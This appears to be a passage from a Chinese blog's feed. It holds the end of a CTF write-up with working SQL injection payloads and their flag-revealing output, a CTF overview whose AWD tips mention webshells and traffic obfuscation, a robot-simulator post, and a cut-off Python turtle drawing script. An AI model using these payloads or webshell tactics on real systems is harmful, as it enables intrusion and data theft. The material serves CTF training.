class="code"><pre><span class="line">Unknown column &apos;2&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为1的时候无显示正确，即当前只有一个显示位</span><br></pre></td></tr></table></figure><p>2.爆所有的数据库，显示在第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br><span class="line">name: information_schema,test,web1</span><br></pre></td></tr></table></figure><p>3.爆web1的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: &apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br><span class="line">name: flag,web_1</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br><span class="line">name: flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</span><br></pre></td></tr></table></figure><h1 id="sql注入-不用逗号"><a href="#sql注入-不用逗号" class="headerlink" title="sql注入(不用逗号)"></a>sql注入(不用逗号)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0e139e4e386402daac82ca824f96de2840a49a8d1e54121.game.ichunqiu.com/l0gin.php?id=<span class="string">' union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=&apos; union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = &apos;sqli&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = &apos; union select * from (select group_concat(column_name ) from information_schema.columns where table_name = &apos;users&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&apos; union select * from (select group_concat(flag_9c861b688330 ) from users ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF简介</title>
      <link href="/2018/08-12-CTF.html"/>
      <url>/2018/08-12-CTF.html</url>
      <content type="html"><![CDATA[<h1 id="CTF-的起源"><a href="#CTF-的起源" class="headerlink" title="CTF 的起源"></a>CTF 的起源</h1><p>CTF 的前身是传统黑客之间网络技术比拼的游戏，起源于 1996 年第四届 DEFCON。</p><hr><h2 id="早期-CTF-竞赛"><a href="#早期-CTF-竞赛" class="headerlink" title="早期 CTF 竞赛"></a>早期 CTF 竞赛</h2><p>最开始的 CTF 比赛（1996 年-2001 年），没有明确的比赛规则，没有专业搭建的比赛平台与环境。由参数队伍各自准备比赛目标（自己准备的比赛目标自己防守并要尝试攻破对方提供的比赛目标）。而组织者大都只是一些非专业的志愿者，接受参赛队伍请求手工计分。<br>没有后台自动系统支持和裁判技术能力认定，计分延迟和误差以及不可靠的网络和不当的配置，导致比赛带来了极大的争论与不满。</p><h2 id="「现代」CTF-竞赛"><a href="#「现代」CTF-竞赛" class="headerlink" title="「现代」CTF 竞赛"></a>「现代」CTF 竞赛</h2><p>由专业队伍承担比赛平台、命题、赛事组织以及自动化积分系统。参赛队伍需提交参赛申请，由 DEFCON 会议组织者们进行评选。<br>就 LegitBS 组织的三年 DEFCON CTF 比赛而言，有以下突出特点：<br>比赛侧重于对计算机底层和系统安全核心能力，Web 漏洞攻防技巧完全不受重视。<br>竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。<br>采用「零和」计分规则。<br>团队综合能力考研：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运维以及面向安全的编程调试。</p><hr><h1 id="CTF赛事介绍"><a href="#CTF赛事介绍" class="headerlink" title="CTF赛事介绍"></a>CTF赛事介绍</h1><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p><h1 id="CTF竞赛模式具体分为以下三类"><a href="#CTF竞赛模式具体分为以下三类" class="headerlink" title="CTF竞赛模式具体分为以下三类"></a>CTF竞赛模式具体分为以下三类</h1><h2 id="解题模式（Jeopardy）"><a href="#解题模式（Jeopardy）" class="headerlink" title="解题模式（Jeopardy）"></a>解题模式（Jeopardy）</h2><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</p><h2 id="攻防模式（Attack-Defense）"><a href="#攻防模式（Attack-Defense）" class="headerlink" title="攻防模式（Attack-Defense）"></a>攻防模式（Attack-Defense）</h2><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p><h2 id="混合模式（Mix）"><a href="#混合模式（Mix）" class="headerlink" title="混合模式（Mix）"></a>混合模式（Mix）</h2><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p><h1 id="题目类别"><a href="#题目类别" class="headerlink" title="题目类别"></a>题目类别</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>所需知识：汇编语言、加密与解密、常见反编译工具</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>所需知识：C，OD+IDA，数据结构，操作系统</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。<br>所需知识：PHP、Python、TCP/IP、SQL</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见编码解码，主要考查参赛选手密码学相关知识点。通常也会和其他题目相结合。<br>所需知识：矩阵、数论、密码学</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Misc 即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等，覆盖面比较广，主要考查参赛选手的各种基础综合知识。<br>所需知识：常见隐写术工具、Wireshark 等流量审查工具、编码知识</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><p>主要分为 Android 和 iOS 两个平台，以 Android 逆向为主，破解 APK 并提交正确答案。<br>所需知识：Java，Android 开发，常见工具</p><hr><h1 id="线下赛-AWD-模式"><a href="#线下赛-AWD-模式" class="headerlink" title="线下赛 AWD 模式"></a>线下赛 AWD 模式</h1><p>Attack With Defence，简而言之就是你既是一个 hacker，又是一个 manager。<br>比赛形式：一般就是一个 ssh 对应一个服务，可能是 web 也可能是 pwn，然后 flag 五分钟一轮，各队一般都有自己的初始分数，flag 被拿会被拿走 flag 的队伍均分，主办方会对每个队伍的服务进行 check，check 不过就扣分，扣除的分值由服务 check 正常的队伍均分。</p><h2 id="怎样拿到-flag"><a href="#怎样拿到-flag" class="headerlink" title="怎样拿到 flag"></a>怎样拿到 flag</h2><p>web 主要是向目标服务器发送 http 请求，返回 flag<br>bin 主要是通过 exploit 脚本读取 /home/username 下某个文件夹下的 flag 文件<br>Web 题目类型<br>出题人自己写的 CMS 或者魔改后的 CMS(注意最新漏洞、1day 漏洞等),常见(比如 Wordpress 博客啊、Discuz! 论坛啊)或者不常见 CMS 等,框架型漏洞(CI等)</p><h2 id="如何在-CTF-中当搅屎棍"><a href="#如何在-CTF-中当搅屎棍" class="headerlink" title="如何在 CTF 中当搅屎棍"></a>如何在 CTF 中当搅屎棍</h2><p>AWD 模式生存技巧能力：<br>漏洞反应能力,快速编写脚本,web代码审计<br>心态放好，因为 web 比较容易抓取流量，所以即使我们被打，我们也可以及时通过分析流量去查看别的队伍的 payload，从而进行反打。<br>脚本准备：一句话，文件包含，不死马、禁止文件上传等,警惕 web 弱口令，用最快的速度去补。</p><h2 id="Bin-题目类型"><a href="#Bin-题目类型" class="headerlink" title="Bin 题目类型"></a>Bin 题目类型</h2><p>大部分是 PWN，题目类型包括栈、堆、格式化字符串等等。<br>能力：<br>迅速找到二进制文件的漏洞，迅速打 patch 的能力,全场打 pwn 的 exp 脚本编写,熟悉服务器运维,尽快摸清楚比赛的 check 机制<br>如果二进制分析遇到障碍难以进行，那就去帮帮 web 选手运维,看看现场环境是否可以提权，这样可以方便我们搞操作（如魔改 libc 等等）<br>技巧<br>如果自己拿到 FB， 先用 NPC 服务器或者自己服务器测试，格外小心自己的 payload 不要被别的队伍抓取到, 写打全场的 exp 时，一定要加入混淆流量。提前准备好 PHP 一句话木马等等脚本。小心其他队伍恶意攻击使我们队伍机器的服务不能正常运行，因此一定要备份服务器的配置。尽可能在不搞崩服务和绕过 check 的情况下，上 WAF，注意分析别人打过来的流量，如果没有混淆，可以大大加快我们的漏洞分析速度。</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>中国菜刀、 Nmap、Xshell、 合适的扫描器等。<br>心态不要崩。<br>不要忽视 Github 等平台，可能会有写好的 exp 可以用。<br>将 flag 的提交自动化。</p><h1 id="参考资料链接"><a href="#参考资料链接" class="headerlink" title="参考资料链接"></a>参考资料链接</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/#/introduction" target="_blank" rel="noopener">CTF资料链接1</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content" target="_blank" rel="noopener">CTF资料链接2</a></p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V-REP PRO机器人仿真系统有趣实例</title>
      <link href="/2018/06-12-V-REP%20PRO.html"/>
      <url>/2018/06-12-V-REP%20PRO.html</url>
      <content type="html"><![CDATA[<p><strong>本文同时有四份较大gif图，对设备性能有一定要求，手机端可能无法加载，建议使用PC电脑端访问</strong><br>V-REP是一款多功能的机器人仿真器,非常有趣。<a href="http://www.coppeliarobotics.com/index.html" target="_blank" rel="noopener">链接</a></p><blockquote><blockquote><p>1.具有4种物理引擎((ODE, Bullet, Vortex, Newton));<br>2.支持Windows，Linux，MacOS三种操作系统;<br>3.支持六种编程方法;<br>4.七种编程语言( (C/C++、Python、Java、Lua、Matlab、Octave、和 Urbi))。</p></blockquote></blockquote><h2 id="实例图"><a href="#实例图" class="headerlink" title="实例图"></a>实例图</h2><h3 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h3><p><img src="/article_img/ros1.gif" alt="&quot;实例1&quot;"></p><h3 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h3><p><img src="/article_img/ros2.gif" alt="&quot;实例2&quot;"></p><h3 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h3><p><img src="/article_img/ros3.gif" alt="&quot;实例3&quot;"></p><h3 id="实例4"><a href="#实例4" class="headerlink" title="实例4"></a>实例4</h3><p><img src="/article_img/ros4.gif" alt="&quot;实例4&quot;"></p>]]></content>
      
      <categories>
          
          <category> ROS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V-REP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python实现小猪佩奇</title>
      <link href="/2018/06-05-python%E5%AE%9E%E7%8E%B0%E5%B0%8F%E7%8C%AA%E4%BD%A9%E5%A5%87.html"/>
      <url>/2018/06-05-python%E5%AE%9E%E7%8E%B0%E5%B0%8F%E7%8C%AA%E4%BD%A9%E5%A5%87.html</url>
      <content type="html"><![CDATA[<p>今天公选课老师上课用ros跑小乌龟之后玩起了小猪佩奇，然后我也去搜了个源码玩一波。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import turtle as t</span><br><span class="line">from Tools.scripts.treesync import raw_input</span><br><span class="line">t.pensize(4) # 设置画笔的大小</span><br><span class="line">t.colormode(255) # 设置GBK颜色范围为0-255</span><br><span class="line">t.color((255,155,192),&quot;pink&quot;) # 设置画笔颜色和填充颜色(pink)</span><br><span class="line">t.setup(840,500) # 设置主窗口的大小为840*500</span><br><span class="line">t.speed(10) # 设置画笔速度为10</span><br><span class="line">input()</span><br><span class="line">#鼻子</span><br><span class="line">t.pu() # 提笔</span><br><span class="line">t.goto(-100,100) # 画笔前往坐标(-100,100)</span><br><span class="line">t.pd() # 下笔</span><br><span class="line">t.seth(-30) # 笔的角度为-30°</span><br><span class="line">t.begin_fill() # 外形填充的开始标志</span><br><span class="line">a=0.4</span><br><span class="line">for i in range(120):</span><br><span class="line">   if 0&lt;=i&lt;30 or 60&lt;=i&lt;90:</span><br><span class="line">       a=a+0.08</span><br><span class="line">       t.lt(3) #向左转3度</span><br><span class="line">       t.fd(a) #向前走a的步长</span><br><span class="line">   else:</span><br><span class="line">       a=a-0.08</span><br><span class="line">       t.lt(3)</span><br><span class="line">       t.fd(a)</span><br><span class="line">t.end_fill() # 依据轮廓填充</span><br><span class="line">t.pu() # 提笔</span><br><span class="line">t.seth(90) # 笔的角度为90度</span><br><span class="line">t.fd(25) # 向前移动25</span><br><span class="line">t.seth(0) # 转换画笔的角度为0</span><br><span class="line">t.fd(10)</span><br><span class="line">t.pd()</span><br><span class="line">t.pencolor(255,155,192) # 设置画笔颜色</span><br><span class="line">t.seth(10)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(5) # 画一个半径为5的圆</span><br><span class="line">t.color(160,82,45) # 设置画笔和填充颜色</span><br><span class="line">t.end_fill()</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(20)</span><br><span class="line">t.pd()</span><br><span class="line">t.pencolor(255,155,192)</span><br><span class="line">t.seth(10)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(5)</span><br><span class="line">t.color(160,82,45)</span><br><span class="line">t.end_fill()</span><br><span class="line">#头</span><br><span class="line">t.color((255,155,192),&quot;pink&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(41)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(0)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.seth(180)</span><br><span class="line">t.circle(300,-30) # 顺时针画一个半径为300,圆心角为30°的园</span><br><span class="line">t.circle(100,-60)</span><br><span class="line">t.circle(80,-100)</span><br><span class="line">t.circle(150,-20)</span><br><span class="line">t.circle(60,-95)</span><br><span class="line">t.seth(161)</span><br><span class="line">t.circle(-300,15)</span><br><span class="line">t.pu()</span><br><span class="line">t.goto(-100,100)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-30)</span><br><span class="line">a=0.4</span><br><span class="line">for i in range(60):</span><br><span class="line">   if 0&lt;=i&lt;30 or 60&lt;=i&lt;90:</span><br><span class="line">       a=a+0.08</span><br><span class="line">       t.lt(3) #向左转3度</span><br><span class="line">       t.fd(a) #向前走a的步长</span><br><span class="line">   else:</span><br><span class="line">       a=a-0.08</span><br><span class="line">       t.lt(3)</span><br><span class="line">       t.fd(a)</span><br><span class="line">t.end_fill()</span><br><span class="line">#耳朵</span><br><span class="line">t.color((255,155,192),&quot;pink&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-7)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(70)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.seth(100)</span><br><span class="line">t.circle(-50,50)</span><br><span class="line">t.circle(-10,120)</span><br><span class="line">t.circle(-50,54)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-12)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(30)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.seth(100)</span><br><span class="line">t.circle(-50,50)</span><br><span class="line">t.circle(-10,120)</span><br><span class="line">t.circle(-50,56)</span><br><span class="line">t.end_fill()</span><br><span class="line">#眼睛</span><br><span class="line">t.color((255,155,192),&quot;white&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-20)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-95)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(15)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.color(&quot;black&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(12)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-3)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(3)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.color((255,155,192),&quot;white&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-25)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(40)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(15)</span><br><span class="line">t.end_fill()</span><br><span class="line">t.color(&quot;black&quot;)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(12)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-3)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(3)</span><br><span class="line">t.end_fill()</span><br><span class="line">#腮</span><br><span class="line">t.color((255,155,192))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-95)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(65)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.circle(30)</span><br><span class="line">t.end_fill()</span><br><span class="line">#嘴</span><br><span class="line">t.color(239,69,19)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(15)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-100)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-80)</span><br><span class="line">t.circle(30,40)</span><br><span class="line">t.circle(40,80)</span><br><span class="line">#身体</span><br><span class="line">t.color(&quot;red&quot;,(255,99,71))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-20)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-78)</span><br><span class="line">t.pd()</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.seth(-130)</span><br><span class="line">t.circle(100,10)</span><br><span class="line">t.circle(300,30)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(230)</span><br><span class="line">t.seth(90)</span><br><span class="line">t.circle(300,30)</span><br><span class="line">t.circle(100,3)</span><br><span class="line">t.color((255,155,192),(255,100,100))</span><br><span class="line">t.seth(-135)</span><br><span class="line">t.circle(-80,63)</span><br><span class="line">t.circle(-150,24)</span><br><span class="line">t.end_fill()</span><br><span class="line">#手</span><br><span class="line">t.color((255,155,192))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-40)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-27)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-160)</span><br><span class="line">t.circle(300,15)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(15)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(0)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-10)</span><br><span class="line">t.circle(-20,90)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(30)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(237)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-20)</span><br><span class="line">t.circle(-300,15)</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(20)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(0)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-170)</span><br><span class="line">t.circle(20,90)</span><br><span class="line">#脚</span><br><span class="line">t.pensize(10)</span><br><span class="line">t.color((240,128,128))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(-75)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(-180)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-90)</span><br><span class="line">t.fd(40)</span><br><span class="line">t.seth(-180)</span><br><span class="line">t.color(&quot;black&quot;)</span><br><span class="line">t.pensize(15)</span><br><span class="line">t.fd(20)</span><br><span class="line">t.pensize(10)</span><br><span class="line">t.color((240,128,128))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(40)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(90)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(-90)</span><br><span 